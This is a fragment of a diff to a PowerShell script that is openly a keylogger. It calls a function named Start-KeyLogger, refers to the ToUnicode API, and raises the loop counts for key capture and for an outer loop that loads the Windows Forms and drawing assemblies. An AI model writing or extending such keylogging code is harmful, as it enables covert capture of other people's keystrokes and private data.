@@ -80,7 +80,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and shows the collected key presses
-    while ($iteration -lt 5) {
+    while ($iteration -lt 10) {
 	  
       Start-Sleep -Milliseconds 40
       
@@ -129,7 +129,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Start-KeyLogger
 
 $i = 0
-while($i -lt 3){
+while($i -lt 50){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
